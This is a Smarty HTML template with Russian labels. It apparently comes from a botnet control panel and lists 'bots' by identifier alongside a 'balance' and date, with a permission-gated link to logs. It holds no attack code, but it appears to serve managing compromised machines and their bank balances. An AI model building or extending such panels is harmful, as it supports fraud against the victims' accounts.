<div class="top_menu">
<div class="top_menu_left">
{if $_SESSION.user->access.logs.cberfiz eq on}<a href="/logs/index.html">Простые логи</a>&nbsp;{/if}
</div>

<div class="top_menu_right">

</div>

</div>

<hr />

<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>

<table cellspacing="1" cellpadding="5" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp3">
<td style="width: 20%; text-align: center">{$lang.bot}</td>
<td style="width: 50%; text-align: center">{$lang.balance}</td>
<td style="width: 50%; text-align: center">{$lang.data}</td>
</tr>
{foreach from=$list item=item key=key name=list}
{if $smarty.foreach.list.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; cursor:pointer;" onclick="gbwc('{$item->prefix}{$item->uid}');">
<th>{$item->prefix}{$item->uid}</th>
<th>{$item->balance}</th>
<th>{$item->post_date}</th>
</tr>
{/foreach}
</table>



<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>